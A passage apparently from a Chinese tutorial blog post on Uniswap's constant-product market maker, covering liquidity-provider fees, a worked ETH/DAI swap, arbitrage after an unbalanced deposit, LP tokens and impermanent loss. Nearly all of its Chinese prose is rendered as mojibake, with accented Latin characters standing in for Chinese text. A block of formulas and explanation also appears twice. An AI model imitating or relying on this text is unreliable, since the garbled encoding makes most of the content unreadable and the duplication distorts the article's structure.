<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Bobå‘é€äº† 1 ETH</span><br><span class="line">è´¹ç”¨ = 0.003 ETH</span><br><span class="line">ETH æ±  = 10 + (1â€“0.003) = 10.997</span><br><span class="line">DAI æ±  = 5000/10.997 = 454.67</span><br><span class="line">Bob å°†å…‘æ¢å¾—åˆ° : 500â€“454.67 = 45.33 DAI</span><br></pre></td></tr></table></figure>

<p>åœ¨Bobå¼€å§‹äº¤æ˜“æ—¶æ”¶å–çš„æµåŠ¨æ€§æä¾›è€…è´¹ç”¨ï¼Œç°åœ¨åˆé‡æ–°æ·»åŠ åˆ°ETHæµåŠ¨æ± é‡Œé¢ã€‚è¿™æ˜¯å¯¹æµåŠ¨æ€§æä¾›è€…çš„ä¸€ç§æŠ¥é…¬ï¼Œå½“è¿™äº›æµåŠ¨æ€§æä¾›è€…ä»æµåŠ¨æ± ä¸­å–å›è‡ªå·±çš„ETHå’ŒERC20ä»£å¸æ—¶ï¼Œå¯ä»¥è·å¾—è¿™äº›æŠ¥é…¬ã€ä¹Ÿå³å½“LPé€€å‡ºçš„æ—¶å€™ï¼Œæ‰çœŸæ­£æ‹¿èµ°ã€‘ã€‚ç”±äºè¿™äº›æµåŠ¨æ€§æä¾›è€…çš„æŠ¥é…¬æ˜¯åœ¨ä¸Šè¿°å…‘æ¢äº¤æ˜“è®¡ç®—åæ‰æ·»åŠ å›ETHæµåŠ¨æ± é‡Œé¢ï¼Œå› æ­¤åœ¨äº¤æ˜“åˆçº¦ä¸Šæ¯æ‰§è¡Œä¸€æ¬¡äº¤æ˜“ï¼Œæ’å®šä¹˜ç§¯å€¼å°±ä¼šå¢åŠ ä¸€ç‚¹ï¼Œè¿™å°±è®©æµåŠ¨æ€§æä¾›è€…ä¸ºäº¤æ˜“åˆçº¦æä¾›æµåŠ¨æ€§è¿™ä»¶äº‹å„¿ï¼Œæˆä¸ºä¸€ç§æœ‰åˆ©å¯å›¾çš„è¡Œä¸ºã€‚è¿™ç¬”äº¤æ˜“å®Œæˆåï¼Œ</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ETH æ±  = 10.997 + 0.003 = 11</span><br><span class="line">DAI æ±  = 454.67</span><br><span class="line">æ–°çš„æ’å®šä¹˜ç§¯å€¼ = 5,001.37</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™æ¬¡äº¤æ˜“ä¸­ï¼ŒBobå…‘æ¢çš„æ±‡ç‡ä¸º 45.33 DAI&#x2F;ETH</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1 ETH å…¥</span><br><span class="line">45.33 DAI å‡º</span><br><span class="line">æ±‡ç‡ = 45.33 DAI/ETH</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹å‡ºï¼Œç›¸æ¯”äºæ²¡æœ‰æ‰‹ç»­è´¹çš„æƒ…å†µï¼ŒBobçš„å…‘æ¢ç‡æ˜¯é™ä½äº†ï¼›åŒæ—¶ï¼Œæ’å®šä¹˜ç§¯å€¼å˜å¤§äº†ã€‚å¤šå‡ºæ¥çš„éƒ¨åˆ†å®é™…ä¸Šå°±æ˜¯æµåŠ¨æ€§æä¾›è€…çš„æŠ¥é…¬ã€‚å¦‚æœæ­¤æ—¶æµåŠ¨æ€§æä¾›è€…é€€å‡ºï¼Œé‚£ä¹ˆå°±ä¼šæ‹¿èµ°æŠ¥é…¬ï¼ŒåŒæ—¶å› ä¸ºèµ„é‡‘æ± ä¸­ç›¸åº”æ¯”ç‡çš„èµ„é‡‘çš„å‡å°‘ï¼Œæ’å®šä¹˜ç§¯ä¼šé™ä½ã€‚</p>
<p>çœ‹å…¬å¼ï¼Œç›¸å½“äºæ˜¯å¯¹ä¹‹å‰ä¾‹å­çš„æŠ½è±¡ã€‚</p>
<p>ä¸è€ƒè™‘æ‰‹ç»­è´¹çš„è®¡ç®—å…¬å¼ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233123.jpg" alt="img"></p>
<p>å¯¹äºä¸ç†è§£ä¸Šé¢å…¬å¼çš„åŒå­¦ï¼Œå¯ä»¥å‚è€ƒä»¥ä¸‹è¡¨æ ¼ä¸­çš„æ•°æ®è‡ªå·±åœ¨excelä¸­æ‰‹åŠ¨æ¼”ç®—ä¸€éï¼Œå¯ä»¥æ›´ç›´è§‚çš„ç†è§£Uniswapçš„å·¥ä½œåŸç†ã€‚ </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233124.jpg" alt="img"></p>
<p>åŠ å…¥æ‰‹ç»­è´¹çš„æ’å®šä¹˜ç§¯å…¬å¼ï¼šä»¥ä¸‹è¿‡ç¨‹æ˜¯åœ¨è®¡ç®—æ‰‹ç»­è´¹çš„æƒ…å†µä¸‹ï¼Œå°†ä¸Šé¢çš„å…¬å¼é‡æ–°æ¨å¯¼äº†ä¸€éã€‚è®¡ç®—äº¤æ˜“ä»·æ ¼ </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233125.jpg" alt="img"></p>
<p>ä¸Šé¢çš„å…¬å¼ä¸­ï¼Œ $\alpha$ æ˜¯çœŸå®çš„ä¹°å®¶çš„ä»˜å‡ºçš„æ¯”ä¾‹ï¼›ä½†æ˜¯åœ¨è®¡ç®—yå€¼çš„æ—¶å€™ï¼Œå»é™¤äº†æ‰‹ç»­è´¹ï¼Œå› æ­¤ï¼Œå¾—åˆ°æ›´å¤šçš„yå€¼ã€‚ä¹Ÿå³</p>
<p>$(1+\alpha)*(1-\beta)&#x3D;1$</p>
<p>å˜æˆäº†$(1+\alpha\gamma)(1-\beta)&#x3D;1$ </p>
<p>æ‰€ä»¥ï¼Œ $\alpha$å’Œ$\beta$  çš„å…³ç³»å°±ä»</p>
<p>$\alpha&#x3D;\frac{\beta}{1-\beta}$</p>
<p>å˜æˆäº†</p>
<p>$\alpha&#x3D;\frac{\beta}{1-\beta}\frac{1}{\gamma}$</p>
<p>ké™¤äº†åœ¨æœ‰äº¤æ˜“æ‰‹ç»­è´¹çš„æƒ…å†µä¼šå˜å¤§ï¼Œè¿˜æœ‰ä¸€ä¸ªæƒ…å†µä¹Ÿä¼šä½¿kå€¼äº§ç”Ÿå˜åŒ–ï¼Œå½“å‘æµåŠ¨æ± ä¸­å¢åŠ æµåŠ¨æ€§çš„æ—¶å€™kä¼šå˜å¤§ï¼Œå½“ä»æµåŠ¨æ± ä¸­å–å›æµåŠ¨èµ„é‡‘æ—¶kä¼šå˜å°ã€‚å…·ä½“å˜åŒ–æ¯”ä¾‹å¯ä»¥å‚è€ƒUniswapç™½çš®ä¹¦ã€‚ </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233126.jpg" alt="img"></p>
<hr>
<p>æ¥ä¸‹æ¥ï¼Œè®¨è®ºä¸‹ï¼ŒæµåŠ¨æ€§æä¾›è€…æä¾›èµ„é‡‘æ—¶çš„æ¯”ä¾‹å’Œå½±å“ã€‚å› ä¸ºæ’å®šä¹˜ç§¯å…¬å¼çš„Kè¶Šå¤§ï¼Œä¹Ÿå°±æ˜¯èµ„é‡‘æ± é‡Œçš„èµ„é‡‘è¶Šå¤šæ—¶ï¼Œä»£å¸äº¤æ¢æ»‘ç‚¹è¶Šå°ï¼ŒæµåŠ¨æ€§ä¹Ÿå°±è¶Šå¥½ã€‚æ‰€ä»¥ï¼ŒAMMæ¨¡å¼é¼“åŠ±ç”¨æˆ·ä¸ºå…‘æ¢èµ„é‡‘æ± æä¾›æµåŠ¨æ€§ï¼Œæ–¹å¼å°±æ˜¯ç”¨æˆ·å‘æµåŠ¨æ€§èµ„é‡‘æ± ä¸­å­˜å…¥ç­‰ä»·å€¼çš„2ç§ä»£å¸ï¼Œæ¯”å¦‚ä¸Šé¢ä¾‹å­é‡Œï¼Œç”¨æˆ·åŒæ—¶å­˜å…¥10ä¸ªETH å’Œ500ä¸ªDAIï¼Œå¾—åˆ°20ä¸ªETHå’Œ1000ä¸ªDAIï¼Œæ­¤æ—¶èƒ½å¤Ÿä½ç½®ETHå’ŒDAIçš„æ¯”ä¾‹ã€‚å¦‚æœç”¨æˆ·å­˜å…¥çš„2ç§ä»£å¸ä¸ç­‰å€¼ï¼Œæ¯”å¦‚ä»–å­˜å…¥äº†10ä¸ªETHå’Œ50ä¸ªDAIï¼Œï¼ˆæ­¤æ—¶çš„å¸‚ä»·è¿˜æ˜¯1ä¸ªETHæ¢50ä¸ªDAIï¼‰è¿™ä¼šé€ æˆå…‘æ¢æ± é‡ŒETHçš„ä¾›ç»™ç›¸å¯¹è¿‡å‰©ï¼ŒETHå’ŒDAIçš„ç›¸å¯¹ä»·å€¼å°±å‡ºç°äº†ä¸å¹³è¡¡ï¼Œæ­¤æ—¶æ± ä¸­çš„ä¾›åº”é‡æ˜¯20ä¸ªETHå’Œ550ä¸ªDAIã€‚ç›¸å½“äºä¸€ä¸ªETHåªèƒ½æ¢27.5ä¸ªDAIã€‚æ­¤æ—¶å¥—åˆ©è€…å°±å¯ä»¥åœ¨å¤–éƒ¨è´­å…¥DAIï¼Œç„¶ååœ¨è¯¥åˆçº¦ä¸­å…‘æ¢ETHï¼Œä»è€Œè¿›è¡Œè·åˆ©ã€‚</p>
<p>å¯ä»¥æ¥è®¡ç®—ä¸€ä¸‹ï¼Œæ­¤æ—¶èµ„é‡‘æ± ä¸­å…±æœ‰</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ETH æ±  = 20</span><br><span class="line">DAI æ±  = 550</span><br><span class="line">æ–°çš„æ’å®šä¹˜ç§¯å€¼ = 20 * 550 = 11000 </span><br></pre></td></tr></table></figure>

<p>å¥—åˆ©è€…æ­¤æ—¶å¯ä»¥ä½¿ç”¨DAIæ¥å…‘æ¢ETHã€‚æ­¤æ—¶ï¼Œå¥—åˆ©è€…å¯ä»¥å‘åˆçº¦ä¸­å­˜å…¥191.6ä¸ªDAIï¼Œæ¥å…‘æ¢ç›¸åº”çš„ETHã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">å¥—åˆ©è€…å‘é€äº† 191.6 DAI</span><br><span class="line">DAI æ±  = 550 + 191.6 =741.6</span><br><span class="line">ETH æ±  = 11000 / 741.6 = 14.83</span><br><span class="line">Bob å°†å…‘æ¢å¾—åˆ° : 20â€“14.83 = 5.17 ETH</span><br><span class="line"></span><br><span class="line">å¥—åˆ©è€…è·åˆ©</span><br><span class="line">5.17 - 191.6/50 = 5.17 - 3.832 = 1.338 ETH </span><br><span class="line">èµ„é‡‘æ± æ¢å¤å¹³è¡¡</span><br><span class="line">741.6 / 14.83 = 50</span><br></pre></td></tr></table></figure>

<p>å¥—åˆ©è€…å¦‚ä½•è®¡ç®—å¾—å‡ºåº”è¯¥å­˜å…¥191.6ä¸ªDAIå‘¢ï¼Ÿ</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ï¼ˆ550 + xï¼‰ * (20 - y) = 11000</span><br><span class="line"> (550 + x) / (20 - y) = 50</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢è®¨è®ºäº†Uniswapé€šè¿‡ç»™æµåŠ¨æ€§æä¾›è€…çš„å¥–åŠ±ï¼Œä¹Ÿå³äº¤æ˜“æ‰€çš„æ‰‹ç»­è´¹ï¼Œæ‰‹ç»­è´¹ç‡ä¸º0.3%ï¼ŒæµåŠ¨æ€§æä¾›è€…ä¹‹é—´ä¾æ®å­˜å…¥èµ„é‡‘çš„ä»½é¢æŒ‰æ¯”ä¾‹åˆ†é…ã€‚åŠ å…¥ä¸€å¤©çš„æˆäº¤é¢æ˜¯40.85äº¿CNYï¼Œé‚£ä¹ˆä¸€å¤©çš„æ‰‹ç»­è´¹å°±æœ‰122ä¸‡å…ƒï¼Œç»è¿‡ä¸€æ®µæ—¶é—´çš„ç§¯ç´¯ï¼ŒæµåŠ¨æ€§æä¾›è€…ï¼ˆLPï¼‰å¾—åˆ°çš„æ‰‹ç»­è´¹å¥–åŠ±é‡‘é¢å°±éå¸¸å¯è§‚äº†ã€‚Uniswapä¼šæ ¹æ®æµåŠ¨æ€§æä¾›è€…å­˜å…¥èµ„é‡‘çš„æ•°é¢å‘ç»™ä»–ä»¬ä¸€å®šæ•°é‡çš„LP tokenï¼Œæˆ‘ä»¬å¯ä»¥ç†è§£ä¸ºå­˜æ¬¾å¥–çŠ¶æˆ–è€…æ”¶æ®ï¼Œå®ƒæ˜¯LPè·å¾—äº¤æ˜“æ‰€æ‰‹ç»­è´¹å¥–åŠ±çš„å‡­è¯ã€‚</p>
<p>ä¸¾ä¸ªä¾‹å­å…·ä½“è¯´æ˜ï¼šå‡è®¾è¿™ä¸ªäº¤æ˜“å¯¹æ˜¯ETHâ€“DAIï¼Œç›®å‰å…‘æ¢æ¯”ä¾‹æ˜¯1ETHâ€“50DAIã€‚æˆ‘å‘èµ„é‡‘æ± å……äº†1ETHå’Œ50DAIï¼Œè¿™ä¸ªèµ„é‡‘æ± å‘ç»™æˆ‘1ä¸ªLP tokenï¼Œä»£è¡¨æˆ‘æœ‰1ä»½ï¼ˆETHâ€“DAIï¼‰çš„æµåŠ¨æ€§è´¡çŒ®ã€‚è¿™ä¸ªèµ„é‡‘æ± æ‰€äº§ç”Ÿçš„æ‰‹ç»­è´¹è¿›å…¥ä¸€ä¸ªpoolï¼Œç»è¿‡ä¸€æ®µæ—¶é—´åï¼Œpoolä¸­å…±æœ‰ç§¯ç´¯çš„æ‰‹ç»­è´¹Aä¸ªETHå’ŒBä¸ªDAIï¼Œå½“æˆ‘æŠŠæˆ‘çš„1ä¸ªLP tokenäº¤è¿˜ç»™Uniswapæ—¶ï¼Œæˆ‘æœ‰æƒåˆ©ä»poolæ‹¿èµ°å®ƒæŒ‰æ¯”ä¾‹å¯¹åº”çš„æ‰‹ç»­è´¹ã€‚å‡è®¾æ­¤æ—¶æ•´ä¸ªèµ„é‡‘æ± å…±å‘å‡ºäº†Xä¸ªLP tokenï¼Œæˆ‘çš„æµåŠ¨æ€§è´¡çŒ®å æ¯”å°±æ˜¯1&#x2F;Xï¼Œæˆ‘å°±å¯ä»¥è·å¾—A&#x2F;Xä¸ªETHå’ŒB&#x2F;Xä¸ªDAIã€æ‰‹ç»­è´¹ã€‘ï¼Œç„¶åå†èµå›æˆ‘çš„1ETHå’Œ50DAIã€‚</p>
<p>Uniswapé€šè¿‡AMMæ¨¡å¼å’Œä¸ºæµåŠ¨æ€§æä¾›è€…å¥–åŠ±æ‰‹ç»­è´¹çš„æ¨¡å¼ï¼Œæå¤§åœ°è°ƒåŠ¨äº†LPçš„ç§¯ææ€§ã€‚ç”±äºä»»ä½•äººéƒ½å¯ä»¥æä¾›æµåŠ¨æ€§å¹¶ä¸”ä»ä¸­è·åˆ©ï¼Œäººä»¬æœ‰åŠ¨åŠ›ä¸ºUniswapæä¾›æµåŠ¨æ€§ï¼›äº¤æ˜“æ‰€è·å¾—å……è¶³çš„äº¤æ˜“æµåŠ¨æ€§ï¼Œäº¤æ˜“æ»‘ç‚¹å°±å°ï¼Œç”¨æˆ·ä½“éªŒä¹Ÿå¥½ã€‚äº¤æ˜“æ‰€çš„è¿è¡Œå®Œå…¨åŸºäºå¸‚åœºçš„éœ€æ±‚è¿›è¡Œã€‚äººå·¥çš„è¿ç»´æˆæœ¬å¤§å¹…é™ä½ã€‚</p>
<p>åœ¨Uniswapä¸­ï¼Œäº¤æ˜“äº§å“çš„æŒ‚ç‰Œä¼šæ˜¯å…è´¹çš„ã€‚è€Œä¸”ç”±äºä¸éœ€è¦å†ç”¨äº¤æ˜“è®¢å•çš„æ¨¡å¼ï¼Œè€Œä¸”æµåŠ¨æ€§ä¹Ÿä¸éœ€è¦ä¸“é—¨çš„åšå¸‚å•†æ¥æä¾›ï¼Œå› æ­¤ç›®å‰è¯åˆ¸å¸‚åœºä¸­çš„åšå¸‚å•†çš„æˆæœ¬å°±å¯ä»¥å–æ¶ˆã€‚é™ä½äº†ä¸Šå¸æˆæœ¬å’Œåšå¸‚æˆæœ¬ï¼ŒUniswapå¯¹DeFiå’Œæ•´ä¸ªåŒºå—é“¾è¡Œä¸šçš„å‘å±•èµ·åˆ°äº†ä¸€å®šçš„ä¿ƒè¿›ä½œç”¨ã€‚</p>
<p>ä½†æ˜¯ï¼Œä½œä¸ºæµåŠ¨æ€§æä¾›è€…ï¼Œè™½ç„¶ä¸ºUniswapæä¾›æµåŠ¨æ€§å¯ä»¥äº¤æ˜“æ‰‹ç»­è´¹ï¼Œä½†ä¹Ÿå­˜åœ¨æ— å¸¸æŸå¤±ã€‚æ— å¿æŸå¤±æ˜¯æŒ‡æµåŠ¨æ€§æä¾›è€…æŒ‰å½“æ—¶çš„å¸‚ä»·å­˜å…¥2ç§ä»£å¸ï¼Œåœ¨ä»–è¦å–å‡ºè¿™äº›ä»£å¸æ—¶ï¼Œå®ƒä»¬çš„å…‘æ¢ä»·æ ¼å‘ç”Ÿäº†å˜åŒ–è€Œå¯¼è‡´çš„æŸå¤±ã€‚å¦‚æœè¿™2ç§ä»£å¸ä¸­æŸä¸ªä»£å¸å¤§å¹…ä¸Šæ¶¨æˆ–ä¸‹è·Œéƒ½å¯èƒ½å¯¼è‡´æ— å¸¸æŸå¤±ã€‚æ³¨æ„ï¼Œä¸ç®¡æ¶¨è¿˜æ˜¯è·Œï¼Œéƒ½æœ‰å¯èƒ½å¯¼è‡´æŸå¤±ã€‚</p>
<p>è¿˜æ˜¯ä»¥ä¸Šé¢çš„DAIå’ŒETHä¸ºä¾‹ã€‚å½“50ä¸ªDAIæ¢1ä¸ªETHæ—¶ï¼Œæˆ‘å­˜å…¥50ä¸ª DAI å’Œ1ä¸ª ETHã€‚å‡è®¾ç°åœ¨è¡Œæƒ…å˜åŒ–ï¼Œä¹Ÿå°±æ˜¯DAIå’ŒETHçš„å…‘æ¢æ¯”ä¾‹å˜åŒ–äº†ï¼šä¸ç®¡ç°åœ¨æ˜¯50ä¸ªDAIæ¢2ä¸ªETHï¼ˆETHè·Œäº†ï¼‰ï¼Œè¿˜æ˜¯100ä¸ªDAIæ¢1ä¸ªETHï¼ˆETHæ¶¨äº†ï¼‰ï¼ŒæµåŠ¨æ€§æä¾›è€…å¦‚æœæƒ³èµå›èµ„é‡‘ï¼Œéƒ½å¿…é¡»æŒ‰ç…§ç°åœ¨çš„å…‘æ¢æ¯”ä¾‹ï¼Œå–å‡ºä»·æ ¼ç›¸ç­‰çš„DAIå’ŒETHï¼Œä¸èƒ½ç ´åèµ„é‡‘æ± ä¸­2ç§ä»£å¸çš„æ¯”ä¾‹å¹³è¡¡ï¼Œä¸ç„¶å¥—åˆ©è€…å°±åˆè¦å‡ºåŠ¨äº†ã€‚è¿™ä¹Ÿå°±æ˜¯è¯´ï¼ŒæµåŠ¨æ€§æä¾›è€…å–å‡ºæ¥çš„ä¸æ˜¯å­˜å…¥çš„50 DAIå’Œ1ä¸ªETHï¼Œè€Œæ˜¯æŒ‰ç…§æ–°çš„å¸‚ä»·çš„å…‘æ¢æ¯”ä¾‹ï¼Œè€Œè¿™ç›¸æ¯”æˆ‘ç›´æ¥æŒæœ‰50 DAIå’Œ1ä¸ªETHä¸åŠ¨ï¼Œæœ‰å¯èƒ½ä¼šäº§ç”ŸæŸå¤±ã€‚</p>
<p>impermanent loss</p>
<p>å‘Uniswapä¸­æä¾›æµåŠ¨æ€§çš„äººä¼šå‘ç°ä¸€ä¸ªç°è±¡ï¼šâ€œç›®å‰åœ¨æµåŠ¨æ± ä¸­èµ„é‡‘çš„ä»·å€¼æ¯”æ”¾å…¥æµåŠ¨æ± ä¹‹å‰çš„èµ„é‡‘ä»·å€¼å°‘äº†ï¼Œä¹Ÿå°±æ˜¯èµ„é‡‘ç¼©æ°´äº†â€ï¼Œè¿™ç§ç°è±¡è¢«ç§°ä¸ºâ€œimpermanent lossâ€ï¼Œimpermanent lossï¼Œä¸­æ–‡ç¿»è¯‘æˆâ€œæ— å¸¸æŸå¤±â€ï¼Œç®€å•æ¥è¯´impermanent lossæ˜¯æŒ‡ä½ å°†åŠ å¯†è´§å¸æ”¾å…¥uniswapä¸­èµšå–çš„æ”¶ç›Šä¸ä½ å°†åŠ å¯†è´§å¸æ”¾å…¥é’±åŒ…ä¸­çš„æ”¶ç›Šä¹‹é—´çš„å·®ã€‚</p>
<p>holdæŒ‡ä¸çœ‹å¸ä»·æ¶¨è·Œé•¿æœŸæŒæœ‰æŸç§åŠ å¯†è´§å¸ï¼ˆhold on for dear lifeï¼‰</p>
<p>impermanent lossé€šå¸¸æ˜¯ç”±äºæµåŠ¨æ± ä¸­çš„ä»·æ ¼å‘ç”Ÿæ³¢åŠ¨å¼•èµ·çš„ï¼Œä¸‹é¢çœ‹ä¸€ä¸ªä¾‹å­ï¼š </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233127.jpg" alt="img"></p>
<p>å¯ä»¥çœ‹å‡ºä»·æ ¼ä»100å˜æˆ120åæˆ‘ä»¬çš„èµ„é‡‘åªæœ‰ä¹‹å‰çš„99.59%ï¼ŒæŸå¤±äº†0.4%å·¦å³ã€‚åªè¦è¿™æ—¶å€™æˆ‘ä»¬ä¸å°†èµ„é‡‘ä»æµåŠ¨æ± ä¸­å–å‡ºï¼Œä¸€æ—¦æµåŠ¨æ± ä¸­çš„å¸ä»·å›åˆ°100æ—¶ï¼Œæˆ‘ä»¬æ˜¯æ²¡æœ‰æŸå¤±çš„ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå«impermanent lossæ— å¸¸æŸå¤±çš„åŸå› ã€‚</p>
<p>ä¸‹å›¾æ¼”ç¤ºimpermanent lossçš„æ¯”ç‡ä¸å½“å‰ä»·æ ¼å˜åŒ–çš„å…³ç³»ï¼ŒOåˆ—è¡¨ç¤ºèµ„é‡‘åˆšæ”¾å…¥æµåŠ¨æ± çš„æƒ…å†µï¼ŒO-&gt;Hè¡¨ç¤ºä»·æ ¼ä¸Šæ¶¨æ—¶impermanent lossçš„å˜åŒ–ï¼ŒA&lt;-Oè¡¨ç¤ºä»·æ ¼ä¸‹è·Œæ—¶impermanent lossçš„å˜åŒ–ã€‚ </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233128.jpg" alt="img"></p>
<p>ä¸‹å›¾æ˜¯æ ¹æ®ä¸Šé¢æ•°æ®ç”»å‡ºçš„å‡½æ•°å›¾åƒï¼Œè“è‰²çš„æ›²çº¿æ˜¯ä¸åŒ…å«æ‰‹ç»­è´¹çš„ï¼Œé»„è‰²çš„å›¾åƒåŒ…å«æ‰‹ç»­è´¹ï¼Œçº¢è‰²çš„çº¿æ¡æ˜¯ä¸ºäº†æ–¹ä¾¿è¯´æ˜ã€‚</p>
<p>å…ˆçœ‹è“è‰²æ›²çº¿ï¼Œå½“ä¸è®¡ç®—æ‰‹ç»­è´¹æ”¶ç›Šçš„æƒ…å†µä¸‹ï¼Œæ— è®ºå¸ä»·ä¸Šæ¶¨æˆ–ä¸‹è·Œï¼ŒæµåŠ¨æ€§æä¾›è€…100%ä¼šæœ‰æŸå¤±ã€‚</p>
<p>å†çœ‹é»„è‰²çš„æ›²çº¿ï¼Œç”±äºé»„è‰²æ›²çº¿æ˜¯è®¡ç®—æ‰‹ç»­è´¹æ”¶ç›Šçš„ï¼Œæ‰€ä»¥åªè¦å¸ä»·åœ¨ä¸€ä¸ªèŒƒå›´å†…æ³¢åŠ¨ï¼ŒæµåŠ¨æ€§æä¾›è€…å¯ä»¥ç¨³èµšæ‰‹ç»­è´¹æ”¶ç›Šã€‚ </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233129.jpg" alt="img"></p>
<p>ç”±æ­¤å¯ä»¥å¾—å‡ºä¸€ä¸ªç»“è®ºè¦ä»‹ç»impermanent losså¯¹æµåŠ¨æ€§æä¾›è€…çš„å½±å“ï¼Œå¯ä»¥ä¸ºä¸¤ä¸ªå¸ä»·ä¹‹é—´æ³¢åŠ¨å°çš„æµåŠ¨æ± æä¾›æµåŠ¨æ€§ã€‚ </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233130.jpg" alt="img"></p>
<p>Â· mean-reverting pairsï¼šå‡å€¼å›å½’çš„äº¤æ˜“å¯¹ï¼Œæ¯”å¦‚ç¨³å®šå¸äº¤æ˜“å¯¹ä¸¤è€…æ³¢åŠ¨æ˜¯æœ€å°çš„ï¼Œå¯ä»¥æœ€å¤§ç¨‹åº¦å‡å°‘impermanent loss Â· correlated pairsï¼šæœ‰æ­£ç›¸å…³æ€§çš„äº¤æ˜“å¯¹ï¼Œä¾‹å¦‚ETH&#x2F;ZRXï¼Œè¿™ä¸¤ä¸ªå¸çš„æ³¢åŠ¨æ–¹å‘åŸºæœ¬ä¸Šæ˜¯ä¸€è‡´çš„ï¼ŒåŒæ¶¨åŒè·Œï¼Œä¸¤è€…ä¹‹é—´çš„ç›¸å¯¹æ³¢åŠ¨å° Â· Uncorrelated pairsï¼šéç›¸å…³æ€§çš„äº¤æ˜“å¯¹ï¼Œå¦‚ETH&#x2F;D<a href="https://link.zhihu.com/?target=http://jizhid.com/number/ai/">AI</a>ï¼Œä¸ºè¿™ç§äº¤æ˜“å¯¹æä¾›æµåŠ¨æ€§ï¼Œèµšå–çš„äº¤æ˜“è´¹æœ‰å¯èƒ½ä¼šè¦†ç›–impermanent loss Â· Inverse correlated pairsï¼šè´Ÿç›¸å…³çš„äº¤æ˜“å¯¹ï¼Œæ˜¯æœ€å±é™©çš„ï¼Œä»–ä»¬ä¹‹é—´æ³¢åŠ¨æ–¹å‘ç›¸åï¼Œä¸¤è€…ä¹‹é—´çš„ç›¸å¯¹æ³¢åŠ¨èŒƒå›´æœ€å¤§ã€‚</p>
<p>ä¸‹é¢æ˜¯è®¡ç®—impermanent lossçš„å…¬å¼ </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233131.jpg" alt="img"></p>
<hr>
<p>çœ‹å…¬å¼ï¼Œç›¸å½“äºæ˜¯å¯¹ä¹‹å‰ä¾‹å­çš„æŠ½è±¡ã€‚</p>
<p>ä¸è€ƒè™‘æ‰‹ç»­è´¹çš„è®¡ç®—å…¬å¼ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233123.jpg" alt="img"></p>
<p>å¯¹äºä¸ç†è§£ä¸Šé¢å…¬å¼çš„åŒå­¦ï¼Œå¯ä»¥å‚è€ƒä»¥ä¸‹è¡¨æ ¼ä¸­çš„æ•°æ®è‡ªå·±åœ¨excelä¸­æ‰‹åŠ¨æ¼”ç®—ä¸€éï¼Œå¯ä»¥æ›´ç›´è§‚çš„ç†è§£Uniswapçš„å·¥ä½œåŸç†ã€‚ </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233124.jpg" alt="img"></p>
<p>åŠ å…¥æ‰‹ç»­è´¹çš„æ’å®šä¹˜ç§¯å…¬å¼ï¼šä»¥ä¸‹è¿‡ç¨‹æ˜¯åœ¨è®¡ç®—æ‰‹ç»­è´¹çš„æƒ…å†µä¸‹ï¼Œå°†ä¸Šé¢çš„å…¬å¼é‡æ–°æ¨å¯¼äº†ä¸€éã€‚è®¡ç®—äº¤æ˜“ä»·æ ¼ </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233125.jpg" alt="img"></p>
<p>ä¸Šé¢çš„å…¬å¼ä¸­ï¼Œ $\alpha$æ˜¯çœŸå®çš„ä¹°å®¶çš„ä»˜å‡ºçš„æ¯”ä¾‹ï¼›ä½†æ˜¯åœ¨è®¡ç®—yå€¼çš„æ—¶å€™ï¼Œå»é™¤äº†æ‰‹ç»­è´¹ï¼Œå› æ­¤ï¼Œå¾—åˆ°æ›´å¤šçš„yå€¼ã€‚ä¹Ÿå³</p>
<p>$(1+\alpha)*(1-\beta)&#x3D;1$</p>
<p>å˜æˆäº†</p>
<p>$(1+\alpha\gamma)*(1-\beta)&#x3D;1$</p>
<p>æ‰€ä»¥,$\alpha$å’Œ$\beta$çš„å…³ç³»å°±ä»</p>
<p>$\alpha&#x3D;\frac{\beta}{1-\beta}$</p>
<p>å˜æˆäº†</p>
<p>$\alpha&#x3D;\frac{\beta}{1-\beta}\frac{1}{\gamma}$</p>
<p>é™¤äº†åœ¨æœ‰äº¤æ˜“æ‰‹ç»­è´¹çš„æƒ…å†µä¼šå˜å¤§ï¼Œè¿˜æœ‰ä¸€ä¸ªæƒ…å†µä¹Ÿä¼šä½¿kå€¼äº§ç”Ÿå˜åŒ–ï¼Œå½“å‘æµåŠ¨æ± ä¸­å¢åŠ æµåŠ¨æ€§çš„æ—¶å€™kä¼šå˜å¤§ï¼Œå½“ä»æµåŠ¨æ± ä¸­å–å›æµåŠ¨èµ„é‡‘æ—¶kä¼šå˜å°ã€‚å…·ä½“å˜åŒ–æ¯”ä¾‹å¯ä»¥å‚è€ƒUniswapç™½çš®ä¹¦ã€‚ </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233126.jpg" alt="img"></p>
<p><strong>æ€»ç»“</strong></p>
<p>ä¼˜ç‚¹</p>
